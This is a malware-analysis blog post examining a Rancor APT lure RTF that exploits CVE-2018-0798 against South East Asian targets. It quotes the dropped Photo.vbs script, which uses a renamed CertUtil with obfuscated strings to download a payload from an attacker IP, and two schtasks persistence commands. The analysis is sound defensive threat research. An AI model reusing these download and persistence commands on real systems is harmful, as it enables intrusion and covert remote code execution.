Summary
Rancor - a Chinese APT identiﬁed by PaloAlto in 2017 has recently been observed targeting
South East Asia using RTF’s containing CVE-2018-0798. They are believed to have goals of
espionage. In this post I review a recently created RTF document used to lure and target South
East Asian entities.

Analysis
While conducting research I came across an RTF document on VirusTotal, which was created on
2019-08-28 at 00:35:00 and uploaded on 2019-09-11 at 08:48:41. Initial review of this RTF
revealed highly suspect activity consistent with APT lures that I have observed in the past.
Upon opening the RTF document you are presented with a list of names written in Khmer, the
ofﬁcial language of Cambodia, and spoken throughout South East Asia. The content of the
document, when translated, attempts to appear as if it was sent by the Cabinet of Cambodia and
lists out names of various government ofﬁcials.

Whilst reviewing this “ofﬁcial” looking document, CVE-2018-0798 is being executed in the
background. CVE-2018-0798 is an RCE vulnerability which allows a stack buffer overﬂow that
can be exploited by a threat actor to perform stack corruption. In July 2019, Anomali wrote a
detailed article on this exploit and how they observed multiple Chinese threat groups utilizing it to
compromise their targets (including Rancor). This allows the attackers to create the ﬁle
“OSEA54d.tmp” in the “C:\Users[username]\AppData\Local\Temp" folder and execute it.
OSEA54d.tmp then drops GoogleUpdate.exe (7b973145f7e1b59330ca4dd1f86b3d55) within
“C:\Windows\System32\spool\drivers\color\“. Analysis of the GoogleUpdate.exe binary reveals it
https://meltx0r.github.io/tech/2019/09/11/rancor-apt.html
is merely CertUtil.exe, a legitimate Microsoft command-line utility that can be used to obtain

certiﬁcate authority information and conﬁgure Certiﬁcate Services. It can also be used for
nefarious purposes, such as downloading ﬁles from a given URL. Next, OSEA54d.tmp creates a
.vbs script in the same folder, titled “Photo.vbs”.
Shown below: Photo.vbs script
wscript.sleep 3000:wscript.createobject("wscript.shell").run
"%windir%\system32\spool\drivers\color\GoogleUpdate.exe -f -u""rlca""che
""h""tt""p"":/""/167.71.237.100/%ComputerName%.png"" %temp%\%ComputerName%.tmp",0,0

Stepping through this script, we can break it down to two parts - ﬁrst it calls “wscript.sleep” which
causes it to suspend the execution of the script for a speciﬁed number of milliseconds (in this
case, 3000). Second, we see it call “wscript.createobject(“wscript.shell”).run”, which allows you to
run a cmdline command from a .vbs script. This runs GoogleUpdate.exe, which we previously
identiﬁed as CertUtil.exe, with the -f and -urlcache ﬂags to force fetch a speciﬁed URL and update
the cache. The URL provided (167.71.237.100/%ComputerName%.png) requests a ﬁle based off
the user’s computer name (i.e. USER-PC), which is then stored in the user’s local temp folder as
a .tmp ﬁle.
Next, I observed OSE91E4.tmp launch two child cmd.exe processes with the following
parameters:
Shown below: “Google-Updates” scheduled task
cmd /c schtasks /create /sc MINUTE /tn "Google-Updates" /tr "msiexec /q /i
%temp%\%ComputerName%.tmp" /mo 3 /F

The ﬁrst cmd.exe calls schtasks to create a scheduled task called “Google-Updates”, which
utilizes “msiexec” to execute the downloaded payload “[ComputerName].tmp” from the user’s
local temp folder once every minute. This would be used to maintain persistence once the
secondary payload was downloaded.
Shown below: “Google-Update” scheduled task
cmd /c schtasks /create /sc MINUTE /tn "Google-Update" /tr "wscript /b
%windir%\system32\spool\drivers\color\Photo.vbs" /mo 2 /F

The second cmd.exe calls schtasks to create a scheduled task called “Google-Update” (note the
missing “s” in comparison to the prior scheduled task. Due to the /F ﬂag, even if they had identical
names, it would forcefully create the task and suppresses warnings if the speciﬁed task already
existed). This utilizes wscript to run “Photo.vbs” from the user’s local temp folder once every
minute.

Shown above: Process graph
Unfortunately, whenever a secondary payload was requested from the URL
“167.71.237.100/[ComputerName].png” containing my computer’s name (USER-PC), regardless
of geolocation, it returned 404 Not Found HTTP responses. That indicates several possibilities to
me - such as the attackers already knowing the computer name of their target and only returning
a payload if it is matched, speciﬁc geolocation requirements, or the ﬁle was removed from the
server.

Due to the ﬁnal payload not being available for analysis, I was unable to compare prior samples
of malware used by Rancor to conﬁrm attribution - however, based on the TTP’s (Tactics,
Techniques, Procedures) observed, I can say with a high degree of conﬁdence that this activity is
related to Rancor APT. Therefore, the ﬁnal payload would have likely been DDKONG or
PLAINTEE malware which serve as backdoors, allowing the actors to list ﬁles, upload/download
ﬁles, and execute other commands.
